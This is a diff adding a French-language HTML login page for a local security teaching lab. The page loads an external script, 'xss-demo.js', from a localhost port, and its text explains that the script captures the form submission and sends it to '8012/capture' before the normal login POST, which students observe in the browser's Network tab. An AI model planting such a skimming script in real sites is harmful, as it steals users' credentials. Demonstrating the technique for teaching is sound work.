@@ -1,0 +1,40 @@
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Site consommateur — connexion</title>
+  <link rel="stylesheet" href="/styles.css">
+  <script src="http://127.0.0.1:8012/xss-demo.js" defer></script>
+</head>
+<body>
+  <main class="shell">
+    <section class="card">
+      <p class="eyebrow">Jour 1 · S5 · Site 8014</p>
+      <h1>Connexion au site consommateur</h1>
+      <p class="lead">Le formulaire semble normal. Un script externe importé dans le <code>&lt;head&gt;</code> écoute pourtant sa soumission.</p>
+
+      <form id="login-form" method="post" action="/login">
+        <label for="username">Nom d’utilisateur fictif</label>
+        <input id="username" name="username" autocomplete="username" value="student" required>
+
+        <label for="password">Mot de passe fictif</label>
+        <input id="password" name="password" type="password" autocomplete="current-password" required>
+
+        <button type="submit">Se connecter</button>
+      </form>
+
+      <p class="warning"><strong>Laboratoire local :</strong> utilisez uniquement une valeur inventée.</p>
+    </section>
+
+    <aside>
+      <h2>À observer dans Network</h2>
+      <ol>
+        <li>Le script <code>xss-demo.js</code> arrive depuis le port <code>8012</code>.</li>
+        <li>La capture part vers <code>8012/capture</code>.</li>
+        <li>Le formulaire termine ensuite son <code>POST /login</code> sur le port <code>8014</code>.</li>
+      </ol>
+    </aside>
+  </main>
+</body>
+</html>
